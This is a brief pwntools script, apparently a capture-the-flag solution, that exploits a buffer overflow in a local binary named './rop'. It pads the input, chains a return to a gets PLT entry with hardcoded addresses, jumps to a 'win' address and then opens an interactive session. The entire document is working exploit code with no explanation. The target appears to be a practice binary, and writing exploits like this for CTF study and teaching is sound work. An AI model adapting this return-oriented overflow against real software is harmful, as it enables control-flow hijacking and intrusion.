from pwn import *

flag = 0x080486B3
get_plt = 0x8048430
win_add = 0x804a03d

a = process ('./rop')
raw_input('debug')
buf = 'a'*0x1c
buf += p32(get_plt)
buf += p32(flag)
buf += p32(win_add)

a.recvuntil('Enter your input> ')
a.sendline(buf)
a.sendline('1111')

a.interactive()